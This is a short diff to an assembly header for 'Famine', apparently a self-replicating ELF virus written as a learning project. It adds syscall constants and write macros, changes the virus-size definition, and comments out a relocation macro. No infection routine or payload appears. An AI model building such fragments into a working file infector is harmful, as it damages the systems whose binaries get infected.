@@ -8,11 +8,12 @@
 %define FILE_SIZE 256
 %define DIRENT 1024
 %define FSTAT 144
+%define ENTRY 16
 %define MAPPED_FILE 8
 
 
-;%define FAMINE_SIZE _v_stop - _famine
-%define FAMINE_SIZE _end - _famine
+%define FAMINE_SIZE _v_stop - _famine
+; %define FAMINE_SIZE _end - _famine
 
 ; ELF_HDR_DEFINITION
 %define ET_EXEC 0x02
@@ -31,18 +32,19 @@
 %define SYS_FSTAT 5
 %define SYS_MUNMAP 11
 %define SYS_EXIT 60
+%define SYS_RENAME 82
 %define SYS_GETDENTS 217
 
 %define SIGNATURE "Famine version 1.0 (c)oded by dbaffier"
 
 %define printf xprintf
 
-%macro rel_init 0
-    call rel_hook
-    rel_hook: pop r12
-%endmacro
+; %macro rel_init 0
+    ; call rel_hook
+    ; rel_hook: pop r12
+; %endmacro
 
-%define rel(offset) r12 + offset - rel_hook
+; %define rel(offset) r12 + offset - rel_hook
 
 %macro dbg 2
     lea rdi, %1
@@ -76,6 +78,22 @@
         mov byte [rdi], byte 0
         cmp %2, 0
         jge .memset
+%endmacro
+
+%macro write 3
+    mov rdi, %1
+    mov rsi, %2
+    mov rdx, %3
+    mov rax, SYS_WRITE
+    syscall
+%endmacro
+
+%macro write_rel 3
+    mov rdi, %1
+    lea rsi, %2
+    mov rdx, %3
+    mov rax, SYS_WRITE
+    syscall
 %endmacro
 
 struc LDIRENT_64
